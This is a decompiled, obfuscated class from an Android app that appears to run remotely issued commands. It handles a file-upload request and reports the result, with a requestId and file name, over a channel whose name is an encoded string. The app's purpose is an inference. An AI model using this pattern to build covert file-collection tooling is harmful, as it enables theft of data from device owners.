package com.storm.safe.rock.service.modules.command;

import com.storm.safe.rock.service.modules.C0323a8;
import com.storm.safe.rock.util.StringUtil;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import org.json.JSONObject;
import p000.C1351vv;
import p000.C1496yx;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.kg1;
import p000.l10;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.modules.command.FileCommandHandler$handleFileUpload$2", m214403f = "FileCommandHandler.kt", m214404l = {}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class FileCommandHandler$handleFileUpload$2 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public final /* synthetic */ C1496yx f53502a1;

    /* renamed from: a2 */
    public final /* synthetic */ String f53503a2;

    /* renamed from: a3 */
    public final /* synthetic */ String f53504a3;

    /* renamed from: a4 */
    public final /* synthetic */ String f53505a4;

    /* renamed from: a5 */
    public final /* synthetic */ String f53506a5;

    /* renamed from: a6 */
    public final /* synthetic */ C0323a8 f53507a6;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public FileCommandHandler$handleFileUpload$2(C1496yx c1496yx, String str, String str2, String str3, String str4, C0323a8 c0323a8, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f53502a1 = c1496yx;
        this.f53503a2 = str;
        this.f53504a3 = str2;
        this.f53505a4 = str3;
        this.f53506a5 = str4;
        this.f53507a6 = c0323a8;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new FileCommandHandler$handleFileUpload$2(this.f53502a1, this.f53503a2, this.f53504a3, this.f53505a4, this.f53506a5, this.f53507a6, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((FileCommandHandler$handleFileUpload$2) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Object invokeSuspend(Object obj) throws Throwable {
        C0323a8 c0323a8 = this.f53507a6;
        String str = this.f53505a4;
        String str2 = this.f53503a2;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        kg1.m213544f4(obj);
        try {
            JSONObject jSONObjectM215323b0 = this.f53502a1.m215323b0(str2, this.f53504a3);
            jSONObjectM215323b0.put("requestId", str);
            jSONObjectM215323b0.put("name", this.f53506a5);
            if (c0323a8 != null) {
                c0323a8.m211658c4(StringUtil.m212470a0("LVAdP3IqCT1HPiVKFA=="), jSONObjectM215323b0);
            }
            t60.m214714d6("FileCmdHandler", "文件上传完成: ".concat(str2));
            return new Integer(0);
        } catch (Exception e) {
            t60.m214705c6("FileCmdHandler", "上传文件失败", e);
            if (c0323a8 == null) {
                return null;
            }
            String strM212470a0 = StringUtil.m212470a0("LVAdP3IqCT1HPiVKFA==");
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("requestId", str);
            String message = e.getMessage();
            if (message == null) {
                message = "未知错误";
            }
            jSONObject.put("error", message);
            c0323a8.m211658c4(strM212470a0, jSONObject);
            return C1351vv.f60710b1;
        }
    }
}
